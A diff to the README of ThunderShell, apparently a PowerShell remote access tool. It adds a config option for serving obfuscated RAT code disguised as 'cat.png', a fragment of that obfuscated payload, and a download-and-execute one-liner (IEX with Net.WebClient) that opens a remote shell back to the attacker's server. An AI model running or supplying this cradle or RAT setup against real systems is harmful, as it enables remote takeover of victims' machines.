@@ -46,9 +46,10 @@ default.json:
         "redis-host": "localhost",
         "redis-port": 6379,
 
-        "http-host": "192.168.17.129",
+        "http-host": "1.1.1.1",
         "http-port": 8080,
         "http-server": "Microsoft-IIS/7.5",
+        "http-download-path": "cat.png",
 
         "https-enabled": "off",
         "https-cert-path": "cert.pem",
@@ -67,6 +68,19 @@ If `https-enabled` is `on`, `https-cert-path` must point to a PEM file with this
 ... (certificate in base64 PEM encoding) ...
 -----END CERTIFICATE-----
 ```
+
+The `http-download-path` is used to deliver the PowerShell RAT code. It will perform variables renaming by default and will deliver the payload only if the path match the one defined by the `"http-download-path` variable.
+
+In this example if the attacker browse to `http://1.1.1.1:8080/cat.png` the web server will return this:
+
+```
+function Get-UserInfo { PROCESS { if( -not (Test-Path env:userdomain)) { $EOhvOhtjB = $env:computername } else { $E
+...
+$gKnYkZ = Random-String -Length $mFkqJYoMKGl $MRdSPFQGDCQ = "hello $($gKnYkZ)" } $MRdSPFQGDCQ = $MRdSPFQGDCQ + "`n" $error.Clear() $ZKajjxCHtc = $MRdSPFQGDCQ + $YzFnzFOxZojQSmZ } } }
+```
+
+On your target you can execute the PowerShell script using the following command `IEX (New-Object Net.WebClient).DownloadString("http://192.168.17.129:8080/cat.png"); PS-RemoteShell -ip 1.1.1.1 -port 8080 -key test`
+
 ### Launching the server
 ```
 me@debian-dev:~$ python ThunderShell.py default.json
